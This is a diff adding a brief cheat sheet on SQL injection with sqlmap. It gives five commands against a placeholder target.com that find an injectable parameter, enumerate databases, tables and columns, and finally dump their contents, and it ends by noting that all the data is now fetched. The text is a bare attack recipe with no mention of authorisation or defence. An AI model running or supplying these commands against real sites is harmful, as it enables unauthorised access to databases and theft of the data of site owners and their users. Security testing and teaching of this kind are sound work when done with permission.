@@ -1,0 +1,9 @@
+                                                               SQL Injection(Sqli)
+
+SQLI using sqlmap :
+1. sqlmap --url https://target.com - For finding id parameter.
+2. sqlmap --url https://target.com/cat.php?id=1 --dbs - For finding database name.
+3. sqlmap --url https://target.com/cat.php?id=1 -D database name --tables - For finding vulnerable tables.
+4. sqlmap --url https://target.com/cat.php?id=1 -D database name -T table name --columns - For finding vulnerable columns.
+5. sqlmap --url https://target.com/cat.php?id=1 -D database name -T table name -C column name,column name --dump
+All done now we will get all the data we have fetched.
